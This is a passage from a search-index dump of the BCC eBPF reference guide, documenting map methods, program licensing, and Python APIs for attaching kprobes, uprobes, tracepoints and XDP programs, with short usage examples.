<p>Default: <code>BPF_SOCKHASH(name, key_type=u32, max_entries=10240)</code></p> <p>For example:</p> <pre><code>struct sock_key {\n  u32 remote_ip4;\n  u32 local_ip4;\n  u32 remote_port;\n  u32 local_port;\n};\nBPF_HASH(skh, struct sock_key, 65535);\n</code></pre> <p>This creates a hash named <code>skh</code> where the key is a <code>struct sock_key</code>.</p> <p>A sockhash is a BPF map type that holds references to sock structs. Then with a new sk/msg redirect bpf helper BPF programs can use the map to redirect skbs/msgs between sockets (<code>map.sk_redirect_hash()/map.msg_redirect_hash()</code>).</p> <p>The difference between <code>BPF_SOCKHASH</code> and <code>BPF_SOCKMAP</code> is that <code>BPF_SOCKMAP</code> is implemented based on an array, and enforces keys to be four bytes. While <code>BPF_SOCKHASH</code> is implemented based on hash table, and the type of key can be specified freely.</p> <p>Methods (covered later): map.sock_hash_update(), map.msg_redirect_hash(), map.sk_redirect_hash().</p> <p>search /tests</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#19-maplookup","title":"19. map.lookup()","text":"<p>Syntax: <code>*val map.lookup(&amp;key)</code></p> <p>Lookup the key in the map, and return a pointer to its value if it exists, else NULL. We pass the key in as an address to a pointer.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#20-maplookup_or_try_init","title":"20. map.lookup_or_try_init()","text":"<p>Syntax: <code>*val map.lookup_or_try_init(&amp;key, &amp;zero)</code></p> <p>Lookup the key in the map, and return a pointer to its value if it exists, else initialize the key's value to the second argument. This is often used to initialize values to zero. If the key cannot be inserted (e.g. the map is full) then NULL is returned.</p> <p>Examples in situ: search /examples, search /tools</p> <p>Note: The old map.lookup_or_init() may cause return from the function, so lookup_or_try_init() is recommended as it does not have this side effect.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#21-mapdelete","title":"21. map.delete()","text":"<p>Syntax: <code>map.delete(&amp;key)</code></p> <p>Delete the key from the hash.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#22-mapupdate","title":"22. map.update()","text":"<p>Syntax: <code>map.update(&amp;key, &amp;val)</code></p> <p>Associate the value in the second argument to the key, overwriting any previous value.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#23-mapinsert","title":"23. map.insert()","text":"<p>Syntax: <code>map.insert(&amp;key, &amp;val)</code></p> <p>Associate the value in the second argument to the key, only if there was no previous value.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#24-mapincrement","title":"24. map.increment()","text":"<p>Syntax: <code>map.increment(key[, increment_amount])</code></p> <p>Increments the key's value by <code>increment_amount</code>, which defaults to 1. Used for histograms.</p> <p><code>map.increment()</code> are not atomic. In the concurrency case. If you want more accurate results, use <code>map.atomic_increment()</code> instead of <code>map.increment()</code>. The overhead of <code>map.increment()</code> and <code>map.atomic_increment()</code> is similar.</p> <p>Note. When using <code>map.atomic_increment()</code> to operate on a BPF map of type <code>BPF_MAP_TYPE_HASH</code>, <code>map.atomic_increment()</code> does not guarantee the atomicity of the operation when the specified key does not exist.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#25-mapget_stackid","title":"25. map.get_stackid()","text":"<p>Syntax: <code>int map.get_stackid(void *ctx, u64 flags)</code></p> <p>This walks the stack found via the struct pt_regs in <code>ctx</code>, saves it in the stack trace map, and returns a unique ID for the stack trace.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#26-mapperf_read","title":"26. map.perf_read()","text":"<p>Syntax: <code>u64 map.perf_read(u32 cpu)</code></p> <p>This returns the hardware performance counter as configured in 5. BPF_PERF_ARRAY</p> <p>Examples in situ: search /tests</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#27-mapcall","title":"27. map.call()","text":"<p>Syntax: <code>void map.call(void *ctx, int index)</code></p> <p>This invokes <code>bpf_tail_call()</code> to tail-call the bpf program which the <code>index</code> entry in BPF_PROG_ARRAY points to. A tail-call is different from the normal call. It reuses the current stack frame after jumping to another bpf program and never goes back. If the <code>index</code> entry is empty, it won't jump anywhere and the program execution continues as normal.</p> <p>For example:</p> <pre><code>BPF_PROG_ARRAY(prog_array, 10);\n\nint tail_call(void *ctx) {\n    bpf_trace_printk(\"Tail-call\\n\");\n    return 0;\n}\n\nint do_tail_call(void *ctx) {\n    bpf_trace_printk(\"Original program\\n\");\n    prog_array.call(ctx, 2);\n    return 0;\n}\n</code></pre> <pre><code>b = BPF(src_file=\"example.c\")\ntail_fn = b.load_func(\"tail_call\", BPF.KPROBE)\nprog_array = b.get_table(\"prog_array\")\nprog_array[c_int(2)] = c_int(tail_fn.fd)\nb.attach_kprobe(event=\"some_kprobe_event\", fn_name=\"do_tail_call\")\n</code></pre> <p>This assigns <code>tail_call()</code> to <code>prog_array[2]</code>. In the end of <code>do_tail_call()</code>, <code>prog_array.call(ctx, 2)</code> tail-calls <code>tail_call()</code> and executes it.</p> <p>NOTE: To prevent infinite loop, the maximum number of tail-calls is 32 (<code>MAX_TAIL_CALL_CNT</code>).</p> <p>Examples in situ: search /examples, search /tests</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#28-mapredirect_map","title":"28. map.redirect_map()","text":"<p>Syntax: <code>int map.redirect_map(int index, int flags)</code></p> <p>This redirects the incoming packets based on the <code>index</code> entry. If the map is BPF_DEVMAP, the packet will be sent to the transmit queue of the network interface that the entry points to. If the map is BPF_CPUMAP, the packet will be sent to the ring buffer of the <code>index</code> CPU and be processed by the CPU later. If the map is BPF_XSKMAP, the packet will be sent to the AF_XDP socket attached to the queue.</p> <p>If the packet is redirected successfully, the function will return XDP_REDIRECT. Otherwise, it will return XDP_ABORTED to discard the packet.</p> <p>For example: <pre><code>BPF_DEVMAP(devmap, 1);\n\nint redirect_example(struct xdp_md *ctx) {\n    return devmap.redirect_map(0, 0);\n}\nint xdp_dummy(struct xdp_md *ctx) {\n    return XDP_PASS;\n}\n</code></pre></p> <pre><code>ip = pyroute2.IPRoute()\nidx = ip.link_lookup(ifname=\"eth1\")[0]\n\nb = bcc.BPF(src_file=\"example.c\")\n\ndevmap = b.get_table(\"devmap\")\ndevmap[c_uint32(0)] = c_int(idx)\n\nin_fn = b.load_func(\"redirect_example\", BPF.XDP)\nout_fn = b.load_func(\"xdp_dummy\", BPF.XDP)\nb.attach_xdp(\"eth0\", in_fn, 0)\nb.attach_xdp(\"eth1\", out_fn, 0)\n</code></pre> <p>Examples in situ: search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#29-mappush","title":"29. map.push()","text":"<p>Syntax: <code>int map.push(&amp;val, int flags)</code></p> <p>Push an element onto a Stack or Queue table. Passing BPF_EXIST as a flag causes the Queue or Stack to discard the oldest element if it is full. Returns 0 on success, negative error on failure.</p> <p>Examples in situ: search /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#30-mappop","title":"30. map.pop()","text":"<p>Syntax: <code>int map.pop(&amp;val)</code></p> <p>Pop an element from a Stack or Queue table. <code>*val</code> is populated with the result. Unlike peeking, popping removes the element. Returns 0 on success, negative error on failure.</p> <p>Examples in situ: search /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#31-mappeek","title":"31. map.peek()","text":"<p>Syntax: <code>int map.peek(&amp;val)</code></p> <p>Peek an element at the head of a Stack or Queue table. <code>*val</code> is populated with the result. Unlike popping, peeking does not remove the element. Returns 0 on success, negative error on failure.</p> <p>Examples in situ: search /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#32-mapsock_hash_update","title":"32. map.sock_hash_update()","text":"<p>Syntax: <code>int map.sock_hash_update(struct bpf_sock_ops *skops, &amp;key, int flags)</code></p> <p>Add an entry to, or update a sockhash map referencing sockets. The skops is used as a new value for the entry associated to key. flags is one of:</p> <pre><code>BPF_NOEXIST: The entry for key must not exist in the map.\nBPF_EXIST: The entry for key must already exist in the map.\nBPF_ANY: No condition on the existence of the entry for key.\n</code></pre> <p>If the map has eBPF programs (parser and verdict), those will be inherited by the socket being added. If the socket is already attached to eBPF programs, this results in an error.</p> <p>Return 0 on success, or a negative error in case of failure.</p> <p>Examples in situ: search /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#33-mapmsg_redirect_hash","title":"33. map.msg_redirect_hash()","text":"<p>Syntax: <code>int map.msg_redirect_hash(struct sk_msg_buff *msg, void *key, u64 flags)</code></p> <p>This helper is used in programs implementing policies at the socket level. If the message msg is allowed to pass (i.e. if the verdict eBPF program returns SK_PASS), redirect it to the socket referenced by map (of type BPF_MAP_TYPE_SOCKHASH) using hash key. Both ingress and egress interfaces can be used for redirection. The BPF_F_INGRESS value in flags is used to make the distinction (ingress path is selected if the flag is present, egress path otherwise). This is the only flag supported for now.</p> <p>Return SK_PASS on success, or SK_DROP on error.</p> <p>Examples in situ: search /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#34-mapsk_redirect_hash","title":"34. map.sk_redirect_hash()","text":"<p>Syntax: <code>int map.sk_redirect_hash(struct sk_buff *skb, void *key, u64 flags)</code></p> <p>This helper is used in programs implementing policies at the skb socket level. If the sk_buff skb is allowed to pass (i.e. if the verdict eBPF program returns SK_PASS), redirect it to the socket referenced by map (of  type  BPF_MAP_TYPE_SOCKHASH) using hash key. Both ingress and egress interfaces can be used for redirection. The BPF_F_INGRESS value in flags is used to make the distinction (ingress path is selected if the flag is present, egress otherwise). This is the only flag supported for now.</p> <p>Return SK_PASS on success, or SK_DROP on error.</p> <p>Examples in situ: search /tests,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#licensing","title":"Licensing","text":"<p>Depending on which BPF helpers are used, a GPL-compatible license is required.</p> <p>The special BCC macro <code>BPF_LICENSE</code> specifies the license of the BPF program. You can set the license as a comment in your source code, but the kernel has a special interface to specify it programmatically. If you need to use GPL-only helpers, it is recommended to specify the macro in your C code so that the kernel can understand it:</p> <pre><code>// SPDX-License-Identifier: GPL-2.0+\n#define BPF_LICENSE GPL\n</code></pre> <p>Otherwise, the kernel may reject loading your program (see the error description below). Note that it supports multiple words and quotes are not necessary:</p> <pre><code>// SPDX-License-Identifier: GPL-2.0+ OR BSD-2-Clause\n#define BPF_LICENSE Dual BSD/GPL\n</code></pre> <p>Check the BPF helpers reference to see which helpers are GPL-only and what the kernel understands as GPL-compatible.</p> <p>If the macro is not specified, BCC will automatically define the license of the program as GPL.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#rewriter","title":"Rewriter","text":"<p>One of jobs for rewriter is to turn implicit memory accesses to explicit ones using kernel helpers. Recent kernel introduced a config option ARCH_HAS_NON_OVERLAPPING_ADDRESS_SPACE which will be set for architectures who user address space and kernel address are disjoint. x86 and arm has this config option set while s390 does not. If ARCH_HAS_NON_OVERLAPPING_ADDRESS_SPACE is not set, the bpf old helper <code>bpf_probe_read()</code> will not be available. Some existing users may have implicit memory accesses to access user memory, so using <code>bpf_probe_read_kernel()</code> will cause their application to fail. Therefore, for non-s390, the rewriter will use <code>bpf_probe_read()</code> for these implicit memory accesses. For s390, <code>bpf_probe_read_kernel()</code> is used as default and users should use <code>bpf_probe_read_user()</code> explicitly when accessing user memories.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#bcc-python","title":"bcc Python","text":""},{"location":"tutorials/bcc-documents/reference_guide_en/#initialization","title":"Initialization","text":"<p>Constructors.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#1-bpf","title":"1. BPF","text":"<p>Syntax: <code>BPF({text=BPF_program | src_file=filename} [, usdt_contexts=[USDT_object, ...]] [, cflags=[arg1, ...]] [, debug=int])</code></p> <p>Creates a BPF object. This is the main object for defining a BPF program, and interacting with its output.</p> <p>Exactly one of <code>text</code> or <code>src_file</code> must be supplied (not both).</p> <p>The <code>cflags</code> specifies additional arguments to be passed to the compiler, for example <code>-DMACRO_NAME=value</code> or <code>-I/include/path</code>.  The arguments are passed as an array, with each element being an additional argument.  Note that strings are not split on whitespace, so each argument must be a different element of the array, e.g. <code>[\"-include\", \"header.h\"]</code>.</p> <p>The <code>debug</code> flags control debug output, and can be or'ed together: - <code>DEBUG_LLVM_IR = 0x1</code> compiled LLVM IR - <code>DEBUG_BPF = 0x2</code> loaded BPF bytecode and register state on branches - <code>DEBUG_PREPROCESSOR = 0x4</code> pre-processor result - <code>DEBUG_SOURCE = 0x8</code> ASM instructions embedded with source - <code>DEBUG_BPF_REGISTER_STATE = 0x10</code> register state on all instructions in addition to DEBUG_BPF - <code>DEBUG_BTF = 0x20</code> print the messages from the <code>libbpf</code> library.</p> <p>Examples:</p> <pre><code># define entire BPF program in one line:\nBPF(text='int do_trace(void *ctx) { bpf_trace_printk(\"hit!\\\\n\"); return 0; }');\n\n# define program as a variable:\nprog = \"\"\"\nint hello(void *ctx) {\n    bpf_trace_printk(\"Hello, World!\\\\n\");\n    return 0;\n}\n\"\"\"\nb = BPF(text=prog)\n\n# source a file:\nb = BPF(src_file = \"vfsreadlat.c\")\n\n# include a USDT object:\nu = USDT(pid=int(pid))\n[...]\nb = BPF(text=bpf_text, usdt_contexts=[u])\n\n# add include paths:\nu = BPF(text=prog, cflags=[\"-I/path/to/include\"])\n</code></pre> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-usdt","title":"2. USDT","text":"<p>Syntax: <code>USDT({pid=pid | path=path})</code></p> <p>Creates an object to instrument User Statically-Defined Tracing (USDT) probes. Its primary method is <code>enable_probe()</code>.</p> <p>Arguments:</p> <ul> <li>pid: attach to this process ID.</li> <li>path: instrument USDT probes from this binary path.</li> </ul> <p>Examples:</p> <pre><code># include a USDT object:\nu = USDT(pid=int(pid))\n[...]\nb = BPF(text=bpf_text, usdt_contexts=[u])\n</code></pre> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#events","title":"Events","text":""},{"location":"tutorials/bcc-documents/reference_guide_en/#1-attach_kprobe","title":"1. attach_kprobe()","text":"<p>Syntax: <code>BPF.attach_kprobe(event=\"event\", fn_name=\"name\")</code></p> <p>Instruments the kernel function <code>event()</code> using kernel dynamic tracing of the function entry, and attaches our C defined function <code>name()</code> to be called when the kernel function is called.</p> <p>For example:</p> <pre><code>b.attach_kprobe(event=\"sys_clone\", fn_name=\"do_trace\")\n</code></pre> <p>This will instrument the kernel <code>sys_clone()</code> function, which will then run our BPF defined <code>do_trace()</code> function each time it is called.</p> <p>You can call attach_kprobe() more than once, and attach your BPF function to multiple kernel functions. You can also call attach_kprobe() more than once to attach multiple BPF functions to the same kernel function.</p> <p>See the previous kprobes section for how to instrument arguments from BPF.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-attach_kretprobe","title":"2. attach_kretprobe()","text":"<p>Syntax: <code>BPF.attach_kretprobe(event=\"event\", fn_name=\"name\" [, maxactive=int])</code></p> <p>Instruments the return of the kernel function <code>event()</code> using kernel dynamic tracing of the function return, and attaches our C defined function <code>name()</code> to be called when the kernel function returns.</p> <p>For example:</p> <pre><code>b.attach_kretprobe(event=\"vfs_read\", fn_name=\"do_return\")\n</code></pre> <p>This will instrument the kernel <code>vfs_read()</code> function, which will then run our BPF defined <code>do_return()</code> function each time it is called.</p> <p>You can call attach_kretprobe() more than once, and attach your BPF function to multiple kernel function returns. You can also call attach_kretprobe() more than once to attach multiple BPF functions to the same kernel function return.</p> <p>When a kretprobe is installed on a kernel function, there is a limit on how many parallel calls it can catch. You can change that limit with <code>maxactive</code>. See the kprobes documentation for its default value.</p> <p>See the previous kretprobes section for how to instrument the return value from BPF.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#3-attach_tracepoint","title":"3. attach_tracepoint()","text":"<p>Syntax: <code>BPF.attach_tracepoint(tp=\"tracepoint\", fn_name=\"name\")</code></p> <p>Instruments the kernel tracepoint described by <code>tracepoint</code>, and when hit, runs the BPF function <code>name()</code>.</p> <p>This is an explicit way to instrument tracepoints. The <code>TRACEPOINT_PROBE</code> syntax, covered in the earlier tracepoints section, is an alternate method with the advantage of auto-declaring an <code>args</code> struct containing the tracepoint arguments. With <code>attach_tracepoint()</code>, the tracepoint arguments need to be declared in the BPF program.</p> <p>For example:</p> <pre><code># define BPF program\nbpf_text = \"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\n\nstruct urandom_read_args {\n    // from /sys/kernel/debug/tracing/events/random/urandom_read/format\n    u64 __unused__;\n    u32 got_bits;\n    u32 pool_left;\n    u32 input_left;\n};\n\nint printarg(struct urandom_read_args *args) {\n    bpf_trace_printk(\"%d\\\\n\", args-&gt;got_bits);\n    return 0;\n};\n\"\"\"\n\n# load BPF program\nb = BPF(text=bpf_text)\nb.attach_tracepoint(\"random:urandom_read\", \"printarg\")\n</code></pre> <p>Notice how the first argument to <code>printarg()</code> is now our defined struct.</p> <p>Examples in situ: code, search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#4-attach_uprobe","title":"4. attach_uprobe()","text":"<p>Syntax: <code>BPF.attach_uprobe(name=\"location\", sym=\"symbol\", fn_name=\"name\" [, sym_off=int])</code>, <code>BPF.attach_uprobe(name=\"location\", sym_re=\"regex\", fn_name=\"name\")</code>, <code>BPF.attach_uprobe(name=\"location\", addr=int, fn_name=\"name\")</code></p> <p>Instruments the user-level function <code>symbol()</code> from either the library or binary named by <code>location</code> using user-level dynamic tracing of the function entry, and attach our C defined function <code>name()</code> to be called whenever the user-level function is called. If <code>sym_off</code> is given, the function is attached to the offset within the symbol.</p> <p>The real address <code>addr</code> may be supplied in place of <code>sym</code>, in which case <code>sym</code> must be set to its default value. If the file is a non-PIE executable, <code>addr</code> must be a virtual address, otherwise it must be an offset relative to the file load address.</p> <p>Instead of a symbol name, a regular expression can be provided in <code>sym_re</code>. The uprobe will then attach to symbols that match the provided regular expression.</p> <p>Libraries can be given in the name argument without the lib prefix, or with the full path (/usr/lib/...). Binaries can be given only with the full path (/bin/sh).</p> <p>For example:</p> <pre><code>b.attach_uprobe(name=\"c\", sym=\"strlen\", fn_name=\"count\")\n</code></pre> <p>This will instrument <code>strlen()</code> function from libc, and call our BPF function <code>count()</code> when it is called. Note how the \"lib\" in \"libc\" is not necessary to specify.</p> <p>Other examples:</p> <pre><code>b.attach_uprobe(name=\"c\", sym=\"getaddrinfo\", fn_name=\"do_entry\")\nb.attach_uprobe(name=\"/usr/bin/python\", sym=\"main\", fn_name=\"do_main\")\n</code></pre> <p>You can call attach_uprobe() more than once, and attach your BPF function to multiple user-level functions.</p> <p>See the previous uprobes section for how to instrument arguments from BPF.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#5-attach_uretprobe","title":"5. attach_uretprobe()","text":"<p>Syntax: <code>BPF.attach_uretprobe(name=\"location\", sym=\"symbol\", fn_name=\"name\")</code></p> <p>Instruments the return of the user-level function <code>symbol()</code> from either the library or binary named by <code>location</code> using user-level dynamic tracing of the function return, and attach our C defined function <code>name()</code> to be called whenever the user-level function returns.</p> <p>For example:</p> <pre><code>b.attach_uretprobe(name=\"c\", sym=\"strlen\", fn_name=\"count\")\n</code></pre> <p>This will instrument <code>strlen()</code> function from libc, and call our BPF function <code>count()</code> when it returns.</p> <p>Other examples:</p> <pre><code>b.attach_uretprobe(name=\"c\", sym=\"getaddrinfo\", fn_name=\"do_return\")\nb.attach_uretprobe(name=\"/usr/bin/python\", sym=\"main\", fn_name=\"do_main\")\n</code></pre> <p>You can call attach_uretprobe() more than once, and attach your BPF function to multiple user-level functions.</p> <p>See the previous uretprobes section for how to instrument the return value from BPF.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#6-usdtenable_probe","title":"6. USDT.enable_probe()","text":"<p>Syntax: <code>USDT.enable_probe(probe=probe, fn_name=name)</code></p> <p>Attaches a BPF C function <code>name</code> to the USDT probe <code>probe</code>.</p> <p>Example:</p> <pre><code># enable USDT probe from given PID\nu = USDT(pid=int(pid))\nu.enable_probe(probe=\"http__server__request\", fn_name=\"do_trace\")\n</code></pre> <p>To check if your binary has USDT probes, and what they are, you can run <code>readelf -n binary</code> and check the stap debug section.</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#7-attach_raw_tracepoint","title":"7. attach_raw_tracepoint()","text":"<p>Syntax: <code>BPF.attach_raw_tracepoint(tp=\"tracepoint\", fn_name=\"name\")</code></p> <p>Instruments the kernel raw tracepoint described by <code>tracepoint</code> (<code>event</code> only, no <code>category</code>), and when hit, runs the BPF function <code>name()</code>.</p> <p>This is an explicit way to instrument tracepoints. The <code>RAW_TRACEPOINT_PROBE</code> syntax, covered in the earlier raw tracepoints section, is an alternate method.</p> <p>For example:</p> <pre><code>b.attach_raw_tracepoint(\"sched_switch\", \"do_trace\")\n</code></pre> <p>Examples in situ: search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#8-attach_raw_socket","title":"8. attach_raw_socket()","text":"<p>Syntax: <code>BPF.attach_raw_socket(fn, dev)</code></p> <p>Attaches a BPF function to the specified network interface.</p> <p>The <code>fn</code> must be the type of <code>BPF.function</code> and the bpf_prog type needs to be <code>BPF_PROG_TYPE_SOCKET_FILTER</code>  (<code>fn=BPF.load_func(func_name, BPF.SOCKET_FILTER)</code>)</p> <p><code>fn.sock</code> is a non-blocking raw socket that was created and bound to <code>dev</code>.</p> <p>All network packets processed by <code>dev</code> are copied to the <code>recv-q</code> of <code>fn.sock</code> after being processed by bpf_prog. Try to recv packet form <code>fn.sock</code> with rev/recvfrom/recvmsg. Note that if the <code>recv-q</code> is not read in time after the <code>recv-q</code> is full, the copied packets will be discarded.</p> <p>We can use this feature to capture network packets just like <code>tcpdump</code>.</p> <p>We can use <code>ss --bpf --packet -p</code> to observe <code>fn.sock</code>.</p> <p>Example:</p> <pre><code>BPF.attach_raw_socket(bpf_func, ifname)\n</code></pre> <p>Examples in situ: search /examples</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#9-attach_xdp","title":"9. attach_xdp()","text":"<p>Syntax: <code>BPF.attach_xdp(dev=\"device\", fn=b.load_func(\"fn_name\",BPF.XDP), flags)</code></p> <p>Instruments the network driver described by <code>dev</code> , and then receives the packet, run the BPF function <code>fn_name()</code> with flags.</p> <p>Here is a list of optional flags.</p> <pre><code># from xdp_flags uapi/linux/if_link.h\nXDP_FLAGS_UPDATE_IF_NOEXIST = (1 &lt;&lt; 0)\nXDP_FLAGS_SKB_MODE = (1 &lt;&lt; 1)\nXDP_FLAGS_DRV_MODE = (1 &lt;&lt; 2)\nXDP_FLAGS_HW_MODE = (1 &lt;&lt; 3)\nXDP_FLAGS_REPLACE = (1 &lt;&lt; 4)\n</code></pre> <p>You can use flags like this <code>BPF.attach_xdp(dev=\"device\", fn=b.load_func(\"fn_name\",BPF.XDP), flags=BPF.XDP_FLAGS_UPDATE_IF_NOEXIST)</code></p> <p>The default value of flags is 0. This means if there is no xdp program with <code>device</code>, the fn will run with that device. If there is an xdp program running with device, the old program will be replaced with new fn program.</p> <p>Currently, bcc does not support XDP_FLAGS_REPLACE flag. The following are the descriptions of other flags.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#1-xdp_flags_update_if_noexist","title":"1. XDP_FLAGS_UPDATE_IF_NOEXIST","text":"<p>If an XDP program is already attached to the specified driver, attaching the XDP program again will fail.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-xdp_flags_skb_mode","title":"2. XDP_FLAGS_SKB_MODE","text":"<p>Driver doesn\u2019t have support for XDP, but the kernel fakes it. XDP program works, but there\u2019s no real performance benefit because packets are handed to kernel stack anyways which then emulates XDP \u2013 this is usually supported with generic network drivers used in home computers, laptops, and virtualized HW.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#3-xdp_flags_drv_mode","title":"3. XDP_FLAGS_DRV_MODE","text":"<p>A driver has XDP support and can hand then to XDP without kernel stack interaction \u2013 Few drivers can support it and those are usually for enterprise HW.</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#4-xdp_flags_hw_mode","title":"4. XDP_FLAGS_HW_MODE","text":"<p>XDP can be loaded and executed directly on the NIC \u2013 just a handful of NICs can do that.</p> <p>For example:</p> <pre><code>b.attach_xdp(dev=\"ens1\", fn=b.load_func(\"do_xdp\", BPF.XDP))\n</code></pre> <p>This will instrument the network device <code>ens1</code> , which will then run our BPF defined <code>do_xdp()</code> function each time it receives packets.</p> <p>Don't forget to call <code>b.remove_xdp(\"ens1\")</code> at the end!</p> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#10-attach_func","title":"10. attach_func()","text":"<p>Syntax: <code>BPF.attach_func(fn, attachable_fd, attach_type [, flags])</code></p> <p>Attaches a BPF function of the specified type to a particular <code>attachable_fd</code>. if the <code>attach_type</code> is <code>BPF_FLOW_DISSECTOR</code>, the function is expected to attach to current net namespace and <code>attachable_fd</code> must be 0.</p> <p>For example:</p> <pre><code>b.attach_func(fn, cgroup_fd, BPFAttachType.CGROUP_SOCK_OPS)\nb.attach_func(fn, map_fd, BPFAttachType.SK_MSG_VERDICT)\n</code></pre> <p>Note. When attached to \"global\" hooks (xdp, tc, lwt, cgroup). If the \"BPF function\" is no longer needed after the program terminates, be sure to call <code>detach_func</code> when the program exits.</p> <p>Examples in situ:</p> <p>search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#11-detach_func","title":"11. detach_func()","text":"<p>Syntax: <code>BPF.detach_func(fn, attachable_fd, attach_type)</code></p> <p>Detaches a BPF function of the specified type.</p> <p>For example:</p> <pre><code>b.detach_func(fn, cgroup_fd, BPFAttachType.CGROUP_SOCK_OPS)\nb.detach_func(fn, map_fd, BPFAttachType.SK_MSG_VERDICT)\n</code></pre> <p>Examples in situ:</p> <p>search /examples,</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#12-detach_kprobe","title":"12. detach_kprobe()","text":"<p>Syntax: <code>BPF.detach_kprobe(event=\"event\", fn_name=\"name\")</code></p> <p>Detach a kprobe handler function of the specified event.</p> <p>For example:</p> <pre><code>b.detach_kprobe(event=\"__page_cache_alloc\", fn_name=\"trace_func_entry\")\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide_en/#13-detach_kretprobe","title":"13. detach_kretprobe()","text":"<p>Syntax: <code>BPF.detach_kretprobe(event=\"event\", fn_name=\"name\")</code></p> <p>Detach a kretprobe handler function of the specified event.</p> <p>For example:</p> <pre><code>b.detach_kretprobe(event=\"__page_cache_alloc\", fn_name=\"trace_func_return\")\n</code></pre>"},{"location":"tutorials/bcc-documents/reference_guide_en/#debug-output","title":"Debug Output","text":""},{"location":"tutorials/bcc-documents/reference_guide_en/#1-trace_print","title":"1. trace_print()","text":"<p>Syntax: <code>BPF.trace_print(fmt=\"fields\")</code></p> <p>This method continually reads the globally shared /sys/kernel/debug/tracing/trace_pipe file and prints its contents. This file can be written to via BPF and the bpf_trace_printk() function, however, that method has limitations, including a lack of concurrent tracing support. The BPF_PERF_OUTPUT mechanism, covered earlier, is preferred.</p> <p>Arguments:</p> <ul> <li><code>fmt</code>: optional, and can contain a field formatting string. It defaults to <code>None</code>.</li> </ul> <p>Examples:</p> <pre><code># print trace_pipe output as-is:\nb.trace_print()\n\n# print PID and message:\nb.trace_print(fmt=\"{1} {5}\")\n</code></pre> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-trace_fields","title":"2. trace_fields()","text":"<p>Syntax: <code>BPF.trace_fields(nonblocking=False)</code></p> <p>This method reads one line from the globally shared /sys/kernel/debug/tracing/trace_pipe file and returns it as fields. This file can be written to via BPF and the bpf_trace_printk() function, however, that method has limitations, including a lack of concurrent tracing support. The BPF_PERF_OUTPUT mechanism, covered earlier, is preferred.</p> <p>Arguments:</p> <ul> <li><code>nonblocking</code>: optional, defaults to <code>False</code>. When set to <code>True</code>, the program will not block waiting for input.</li> </ul> <p>Examples:</p> <pre><code>while 1:\n    try:\n        (task, pid, cpu, flags, ts, msg) = b.trace_fields()\n    except ValueError:\n        continue\n    [...]\n</code></pre> <p>Examples in situ: search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#output-apis","title":"Output APIs","text":"<p>Normal output from a BPF program is either:</p> <ul> <li>per-event: using PERF_EVENT_OUTPUT, open_perf_buffer(), and perf_buffer_poll().</li> <li>map summary: using items(), or print_log2_hist(), covered in the Maps section.</li> </ul>"},{"location":"tutorials/bcc-documents/reference_guide_en/#1-perf_buffer_poll","title":"1. perf_buffer_poll()","text":"<p>Syntax: <code>BPF.perf_buffer_poll(timeout=T)</code></p> <p>This polls from all open perf ring buffers, calling the callback function that was provided when calling open_perf_buffer for each entry.</p> <p>The timeout parameter is optional and measured in milliseconds. In its absence, polling continues indefinitely.</p> <p>Example:</p> <pre><code># loop with callback to print_event\nb[\"events\"].open_perf_buffer(print_event)\nwhile 1:\n    try:\n        b.perf_buffer_poll()\n    except KeyboardInterrupt:\n        exit();\n</code></pre> <p>Examples in situ: code, search /examples, search /tools</p>"},{"location":"tutorials/bcc-documents/reference_guide_en/#2-ring_buffer_poll","title":"2. ring_buffer_poll()","text":"<p>Syntax: <code>BPF.ring_buffer_poll(timeout=T)</code></p> <p>This polls from all open ringbuf ring buffers, calling the callback function that was provided when calling open_ring_buffer for each entry.</p> <p>The timeout parameter is optional and measured in milliseconds. In its absence, polling continues until there is no more data or the 